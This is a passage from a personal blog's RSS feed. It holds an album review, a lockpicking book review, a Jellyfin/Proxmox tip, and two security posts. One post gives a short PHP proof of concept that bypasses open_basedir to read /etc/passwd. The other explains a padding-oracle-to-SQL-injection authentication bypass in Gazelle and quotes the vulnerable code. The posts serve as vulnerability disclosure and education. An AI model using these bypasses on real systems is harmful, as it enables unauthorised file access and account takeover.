+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">jvoisin</dc:creator><pubDate>Fri, 24 Nov 2023 16:30:00 +0100</pubDate><guid isPermaLink="false">tag:dustri.org,2023-11-24:/b/managing-a-bouncer-via-openrc.html</guid><category>sysadmin</category></item><item><title>Netra - Ingrats</title><link>https://dustri.org/b/netra-ingrats.html</link><description>&lt;p&gt;&lt;a href="https://hypnoticdirgerecords.bandcamp.com/album/ingrats"&gt;&lt;img alt="Cover" src="https://dustri.org/b/images/netra_ingrats.jpg"&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Ingrats&lt;/em&gt; ("ungrateful ones" in French) is the 3&lt;sup&gt;rd&lt;/sup&gt; album from
+Netra, and it's a very lonely one, for I don't think it has any peers. A mix of
+depressive black metal, trip hop, and jazz à la &lt;a href="https://en.wikipedia.org/wiki/Bohren_%26_der_Club_of_Gore"&gt;Bohren &amp;amp; der Club of
+Gore&lt;/a&gt; in equal
+measures, bound together with a hint of depressive darkwave, resulting
+in a not only surprisingly cohesive and daring record, but also an excessively
+pleasant and honest one.&lt;/p&gt;
+&lt;p&gt;Opening with "Gimme a break", a mellow jazzy noir blues vibe where one wants to
+snap in rhythm, things quickly devolve into blast beats, raw screams and
+twisted guitar of "Everything’s Fine", arguably the most black-metal-esque song
+of the album. Albeit it is way more than yet-another-black-metal-track,
+morphing into something more complex, with an eerie piano melody, and some
+almost gothic rock clear singing. The sudden transitions are perfectly
+executed, and the work on the voices is truly delicious, resulting in an
+alienating, impetuous yet melancholic track. "Underneath my words the ruins of
+yours" is a subtle mix of trip-hop and atmospheric post-rock/darkwave,
+pursuing with "Live with It", even more trip-hop, but this time with a
+&lt;a href="https://en.wikipedia.org/wiki/Syncopation"&gt;syncopated&lt;/a&gt; rhythm, 80s gothic
+rock, clean vocals and acoustic guitars, … it results in something like
+Katatonia doing a feat with &lt;a href="https://en.wikipedia.org/wiki/Gramatik"&gt;Gramatik&lt;/a&gt;
+and &lt;a href="https://en.wikipedia.org/wiki/Ulver"&gt;Ulver&lt;/a&gt; period early 2000s.&lt;/p&gt;
+&lt;p&gt;Then the calm before the storm, "Infinite bordedom", a one minute interlude of grainy piano under the rain,
+announcing "Don't Keep Me Waiting", some sort of nihilist black metal track,
+but with the noted presence of a saxophone and some clear touches of jazz. The presence of a whispered sample
+from &lt;a href="https://en.wikipedia.org/wiki/The_Minister"&gt;L’exercice de l’État&lt;/a&gt;
+has a gentle touch of &lt;a href="https://www.metal-archives.com/bands/B%C3%A2%27a/3540445572"&gt;Ba'a&lt;/a&gt;. Moving on
+to "A Genuinely Benevolent Man", starting with synthesisers,
+then a 4|4 kick resulting in something that could be on a &lt;a href="https://en.wikipedia.org/wiki/VNV_Nation"&gt;VNV Nation&lt;/a&gt; album.
+Until it decays into something more raw, and when the shrieking vocals
+are showing up, you didn't even realise that we've left the world of the darkwave
+to return into the one of black metal.&lt;/p&gt;
+&lt;p&gt;"Paris or Me", dark and rainy, with bits of triptop percussion,
+introducing "Could've, Should've, Would've", with tasteful hints of Depeche Mode, Dead Can Dance,
+post-2000 Velvet Acid Christ, giving it a resolute tasteful darkwave-synth-pop-EBM
+cocktail. The album ends with "Jusqu'au-boutiste", starting with some jazzy piano on a &lt;a href="https://en.wikipedia.org/wiki/Bassline#Walking_bass"&gt;walking
+bass&lt;/a&gt;, turning into an ultra-saturated tremolo riff with blast beats,
+and both worlds are alternating along the track, only interrupted by a very à
+propos sample from &lt;a href="https://en.wikipedia.org/wiki/Low_Down"&gt;Low Down&lt;/a&gt;. It goes
+on until the piano gets creepier and creepier, landing into strings,
+morphing into dislocated tip-hop soul, beaching onto calm synthesisers,
+and ending with raw black metal as background for electronic sounds.&lt;/p&gt;
+&lt;p&gt;As &lt;a href="https://hypnoticdirgerecords.com/"&gt;Hypnotic Dirge Records&lt;/a&gt;, the label on which the disc was produced, perfectly
+summarised:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;The perfect soundtrack for late-night walks in the city. The material on
+“Ingrats” is an all-out assault on the senses, a bitter pill that must be
+swallowed as an accompaniment for self-reflection. An album which can connect
+emotionally and leave you drained at the end.&lt;/p&gt;
+&lt;/blockquote&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">jvoisin</dc:creator><pubDate>Sat, 18 Nov 2023 22:45:00 +0100</pubDate><guid isPermaLink="false">tag:dustri.org,2023-11-18:/b/netra-ingrats.html</guid><category>music</category></item><item><title>ini_set based open_basedir bypass</title><link>https://dustri.org/b/ini_set-based-open_basedir-bypass.html</link><description>&lt;p&gt;This one was burned by &lt;a href="https://twitter.com/Blaklis_"&gt;Blaklis&lt;/a&gt; in 2019,
+by being the expected solution for his 
+&lt;a href="https://github.com/Blaklis/my-challenges/tree/master/phuck3"&gt;Phuck3&lt;/a&gt; challenge
+for InsomniHack Finals 2019, but has been known long before.&lt;/p&gt;
+&lt;p&gt;In the words of &lt;a href="https://www.php.net/manual/en/ini.core.php#ini.open-basedir"&gt;PHP's documentation&lt;/a&gt; on &lt;code&gt;open_basedir&lt;/code&gt;:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;When a script tries to access the filesystem, for example using include,
+or fopen(), the location of the file is checked. When the file is outside the
+specified directory-tree, PHP will refuse to access it. All symbolic links are
+resolved, so it's not possible to avoid this restriction with a symlink. If the
+file doesn't exist then the symlink couldn't be resolved and the filename is
+compared to (a resolved) open_basedir. &lt;/p&gt;
+&lt;p&gt;[…]&lt;/p&gt;
+&lt;p&gt;open_basedir is just an extra safety net, that is in no way comprehensive, and can therefore not be relied upon when security is needed. &lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;It has been more or less fixed in &lt;a href="https://github.com/php/php-src/commit/ee9e07541f9f07762e3ee781102eea3a4190787c"&gt;March 2021&lt;/a&gt;,
+then again in &lt;a href="https://github.com/php/php-src/commit/61e98bf35eb939bdd7b27ad7938f8549db2e1551"&gt;March 2023&lt;/a&gt;,
+and again in &lt;a href="https://github.com/php/php-src/commit/9bcdf219ec6e8d6c2a55f1712b7d868b9129ef8d"&gt;July 2023&lt;/a&gt;.
+But I wouldn't be surprised if more low-hanging bypasses were lurking ;)&lt;/p&gt;
+&lt;p&gt;The crux of the bypass is that php didn't resolve relative paths both in
+&lt;code&gt;ini_set&lt;/code&gt; and when checking &lt;code&gt;php_check_open_basedir&lt;/code&gt;:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="o"&gt;&amp;lt;?&lt;/span&gt;&lt;span class="nx"&gt;php&lt;/span&gt;
+&lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nb"&gt;ini_get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;open_basedir&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// /var/www/html&lt;/span&gt;
+&lt;span class="nb"&gt;mkdir&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;./tmp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="nb"&gt;chdir&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;./tmp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="nb"&gt;ini_set&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;open_basedir&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;..&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="mi"&gt;24&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="nb"&gt;chdir&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;..&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="nb"&gt;ini_set&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;open_basedir&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nb"&gt;file_get_contents&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/etc/passwd&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">jvoisin</dc:creator><pubDate>Fri, 03 Nov 2023 16:30:00 +0100</pubDate><guid isPermaLink="false">tag:dustri.org,2023-11-03:/b/ini_set-based-open_basedir-bypass.html</guid><category>php</category></item><item><title>Book review: Locksport - A Hacker’s Guide to Lockpicking, Impressioning, and Safe Cracking</title><link>https://dustri.org/b/book-review-locksport-a-hackers-guide-to-lockpicking-impressioning-and-safe-cracking.html</link><description>&lt;p&gt;&lt;a href="https://nostarch.com/locksport"&gt;&lt;img alt="Locksport's cover" src="https://dustri.org/b/images/locksport.png"&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;I'm starting to feel guilty about getting ebooks for free from 
+&lt;a href="https://nostarch.com/about"&gt;No Starch Press&lt;/a&gt;, but apparently they're happy to
+send them my way in exchange for a review, so I won't complain.&lt;/p&gt;
+&lt;p&gt;Anyway, I got a copy of the early access version &lt;a href="https://nostarch.com/locksport"&gt;Locksport - A Hacker’s Guide to Lockpicking,
+Impressioning, and Safe Cracking&lt;/a&gt;!
+It's obviously a book about lockpicking, but, as &lt;em&gt;hinted&lt;/em&gt; by its name, 
+from the &lt;a href="https://www.lockwiki.com/index.php/Locks port"&gt;sport&lt;/a&gt; angle.&lt;/p&gt;
+&lt;p&gt;I'm not completely clueless when it comes to picking locks, but I've always been
+mediocre at best, since I never really put the effort into practising anything
+but the basics. This was thus a great opportunity for a deeper dive!
+So I got myself a &lt;a href="https://covertinstruments.com/collections/lockpicks/products/genesis-lock-pick"&gt;proper set of picks&lt;/a&gt;,
+3 cutaway training locks &lt;a href="https://www.sparrowslockpicks.com/products/cut-away-lock-serrated-pins"&gt;one with serrated pins&lt;/a&gt;,
+&lt;a href="https://www.sparrowslockpicks.com/products/cut-away-lock-spool-pins"&gt;with spool pins&lt;/a&gt;,
+and &lt;a href="https://www.sparrowslockpicks.com/products/cut-away-lock-check-pins"&gt;one with stupid chess pieces pins&lt;/a&gt;,
+and a couple of locks/padlocks from my local locksmith, and dove into the book!&lt;/p&gt;
+&lt;p&gt;I was a bit curious about its content, since I didn't bother reading the table of contents,
+and was expecting a pile of techniques to open &lt;a href="https://en.wikipedia.org/wiki/Wafer_tumbler_lock"&gt;wafer tumbler locks&lt;/a&gt;
+in the fastest way possible. But the book is so much more than that, with
+historical perspectives, a bit of legalese, the proper etiquette to participate in lockpicking
+competitions and how to organise one, anecdotes, mechanical details and
+resources for those who &lt;a href="https://en.wikipedia.org/wiki/Starship_Troopers_(film)"&gt;would like to know
+more&lt;/a&gt;, how to tear
+apart, modify, take care of, and reassemble locks, where to get equipment,
+how to &lt;a href="https://www.lockwiki.com/index.php/Impressioning"&gt;impression keys&lt;/a&gt;,
+details on &lt;a href="https://en.wikipedia.org/wiki/Lever_tumbler_lock"&gt;lever tumbler locks&lt;/a&gt;
+and &lt;a href="https://en.wikipedia.org/wiki/Safe"&gt;vaults&lt;/a&gt;,
+…&lt;/p&gt;
+&lt;p&gt;The part about wafer locks, while interesting, doesn't really go much further
+than some basic techniques for entry-level &lt;a href="https://lockwiki.com/index.php/Security_pin#Security_pin_illustrations"&gt;security pins&lt;/a&gt;,
+but I guess practise is the only way to learn how to handle anything non-trivial anyway.
+On the other hand, the part about lever locks was highly entertaining,
+since those are really weird compared to the &lt;em&gt;usual&lt;/em&gt; locks,
+and I didn't know much about them.&lt;/p&gt;
+&lt;p&gt;I recently gifted myself a &lt;a href="https://www.sparrowslockpicks.com/products/challenge-vault"&gt;Sparrow's challenge vault&lt;/a&gt; for my birthday,
+and was thus highly delighted to discover that the book has a whole section
+on &lt;a href="https://en.wikipedia.org/wiki/Safe-cracking"&gt;safe manipulation&lt;/a&gt;; which is
+fortunate since the instructions coming with the vault are &lt;s&gt;pure garbage&lt;/s&gt;
+confusing at best.&lt;/p&gt;
+&lt;p&gt;The only issue I had with the book is that while it's full of gorgeous colourful
+pictures, like the small marks left by pins during key impressioning,
+they are unfortunately barely legible on my
+&lt;a href="https://www.pocketbook-int.com/ge/products/pocketbook-inkpad-3"&gt;Pocketbook InkPad 3&lt;/a&gt;,
+so I'd recommend getting the paperback version if you don't have a 𝖙𝖗𝖚𝖊𝖈𝖔𝖑𝖔𝖗 4𝖐
+𝕳𝕯𝕽 e-reader.&lt;/p&gt;
+&lt;p&gt;All in all, it's a really great self-contained book for newcomers and beginners,
+entertaining, detailed, … and doing a tremendous job at making
+lockpicking competitions look cool yet accessible! It was also a nice motivation booster for me to
+tackle harder locks.&lt;/p&gt;
+&lt;p&gt;If you already know your way around locks, you might want to look at &lt;a href="https://www.barnesandnoble.com/w/high-security-mechanical-locks-graham-pulford/1111341233"&gt;High-Security Mechanical Locks: An
+Encyclopedic
+Reference&lt;/a&gt; instead.&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">jvoisin</dc:creator><pubDate>Fri, 20 Oct 2023 18:00:00 +0200</pubDate><guid isPermaLink="false">tag:dustri.org,2023-10-20:/b/book-review-locksport-a-hackers-guide-to-lockpicking-impressioning-and-safe-cracking.html</guid><category>book_reviews</category></item><item><title>Authentication bypass on What.CD's Gazelle</title><link>https://dustri.org/b/authentication-bypass-on-whatcds-gazelle.html</link><description>&lt;p&gt;&lt;a href="https://en.wikipedia.org/wiki/What.CD"&gt;What.CD&lt;/a&gt; has been dead since 2016, and
+hopefully &lt;a href="https://github.com/OPSnet/Gazelle/blob/master/app/Util/Crypto.php"&gt;nobody&lt;/a&gt;
+is using &lt;a href="https://github.com/WhatCD/Gazelle"&gt;Gazelle&lt;/a&gt;,
+their "web framework geared towards private BitTorrent tracker" anymore.
+I've been sitting on this one for years, I know I wasn't the only one,
+and it's not the only low-hanging vulnerability lurking there.&lt;/p&gt;
+&lt;p&gt;Rolling your own blunt is alright, rolling your own authentication scheme
+less so: there is a trivial &lt;a href="https://en.wikipedia.org/wiki/Padding_oracle_attack"&gt;padding oracle&lt;/a&gt;
+in the &lt;a href="https://github.com/WhatCD/Gazelle/blob/master/classes/encrypt.class.php#L24"&gt;homegrown crypto scheme&lt;/a&gt;:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;public&lt;/span&gt; &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;decrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$CryptStr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$Key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;ENCKEY&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$CryptStr&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+        &lt;span class="nv"&gt;$IV&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;substr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;base64_decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$CryptStr&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+        &lt;span class="nv"&gt;$CryptStr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;substr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;base64_decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$CryptStr&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nb"&gt;trim&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;mcrypt_decrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;MCRYPT_RIJNDAEL_128&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$Key&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$CryptStr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;MCRYPT_MODE_CBC&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$IV&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;leading to an &lt;a href="https://github.com/WhatCD/Gazelle/blob/master/classes/ajax_start.php#L23-L31"&gt;authentication bypass via a SQL injection&lt;/a&gt;:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;isset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_COOKIE&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;session&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="nv"&gt;$LoginCookie&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$Enc&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="na"&gt;decrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_COOKIE&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;session&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;isset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$LoginCookie&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="k"&gt;list&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$SessionID&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$UserID&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;explode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;|~|&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$Enc&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="na"&gt;decrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$LoginCookie&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
+
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nv"&gt;$UserID&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nv"&gt;$SessionID&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+        &lt;span class="k"&gt;die&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Not logged in!&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
+
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nv"&gt;$Enabled&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$Cache&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="na"&gt;get_value&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;enabled_&lt;/span&gt;&lt;span class="si"&gt;$UserID&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+        &lt;span class="k"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;SERVER_ROOT&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/classes/mysql.class.php&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;//Require the database wrapper&lt;/span&gt;
+        &lt;span class="nv"&gt;$DB&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;NEW&lt;/span&gt; &lt;span class="nx"&gt;DB_MYSQL&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;//Load the database wrapper&lt;/span&gt;
+        &lt;span class="nv"&gt;$DB&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="na"&gt;query&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s2"&gt;            SELECT Enabled&lt;/span&gt;
+&lt;span class="s2"&gt;            FROM users_main&lt;/span&gt;
+&lt;span class="s2"&gt;            WHERE ID = &amp;#39;&lt;/span&gt;&lt;span class="si"&gt;$UserID&lt;/span&gt;&lt;span class="s2"&gt;&amp;#39;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+        &lt;span class="k"&gt;list&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$Enabled&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$DB&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="na"&gt;next_record&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+        &lt;span class="nv"&gt;$Cache&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="na"&gt;cache_value&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;enabled_&lt;/span&gt;&lt;span class="si"&gt;$UserID&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$Enabled&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="k"&gt;die&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Not logged in!&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Conveniently, the oracle doesn't touch the database, is completely stateless,
+and only shows up in the httpd/reverse-proxy's logs, which shouldn't log the cookies'
+content, making forensic analysis nigh impossible. Once you're admin, there are
+a bunch of available SQL injections, like in
+&lt;a href="https://github.com/WhatCD/Gazelle/blob/master/sections/reportsv2/takeresolve.php"&gt;&lt;code&gt;takerevolve.php&lt;/code&gt;&lt;/a&gt;.
+From there, remote code execution is doable, but left as an exercise for the
+reader.&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">jvoisin</dc:creator><pubDate>Fri, 13 Oct 2023 19:45:00 +0200</pubDate><guid isPermaLink="false">tag:dustri.org,2023-10-13:/b/authentication-bypass-on-whatcds-gazelle.html</guid><category>security</category></item><item><title>Video acceleration in Jellyfin inside a Proxmox container</title><link>https://dustri.org/b/video-acceleration-in-jellyfin-inside-a-proxmox-container.html</link><description>&lt;p&gt;For various reasons, including "video decoding is hard", "your web browser hates you"
+and "watching movies on a phone over 3G is a basic human necessity",
+enabling hardware-accelerated video decoding in &lt;a href="https://jellyfin.org"&gt;Jellyfin&lt;/a&gt;
+is a desirable goal if you don't want your CPU to set your house on fire. &lt;/p&gt;
+&lt;p&gt;To attain it, one can mess around &lt;a href="https://github.com/ddimick/proxmox-lxc-idmapper"&gt;cryptic gid mappings&lt;/a&gt;,
+but granting every user on the hypervisor the right to read/write &lt;code&gt;/dev/dri/renderD128&lt;/code&gt; and
+&lt;code&gt;/dev/dri/card0&lt;/code&gt; is way easier, and it looks like this:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="gp"&gt;# &lt;/span&gt;cat&lt;span class="w"&gt; &lt;/span&gt;&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;/etc/udev/rules.d/99-intel-chmod666.rules&lt;span class="w"&gt; &lt;/span&gt;&amp;lt;&amp;lt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;EOF&amp;#39;&lt;/span&gt;
+&lt;span class="go"&gt;KERNEL==&amp;quot;renderD128&amp;quot;, MODE=&amp;quot;0666&amp;quot;&lt;/span&gt;
+&lt;span class="go"&gt;KERNEL==&amp;quot;card0&amp;quot;, MODE=&amp;quot;0666&amp;quot;&lt;/span&gt;
+&lt;span class="go"&gt;EOF&lt;/span&gt;
+&lt;span class="gp"&gt;# &lt;/span&gt;udevadm&lt;span class="w"&gt; &lt;/span&gt;control&lt;span class="w"&gt; &lt;/span&gt;--reload-rules&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;udevadm&lt;span class="w"&gt; &lt;/span&gt;trigger
+&lt;span class="gp"&gt;#&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;It doesn't really worsen security, since:
+- the devices are only mounted inside my jellyfin container, which would have
+  the same privileges as if I used gid mapping.
+- odds are that an attacker able to get a shell on the hypervisor wouldn't
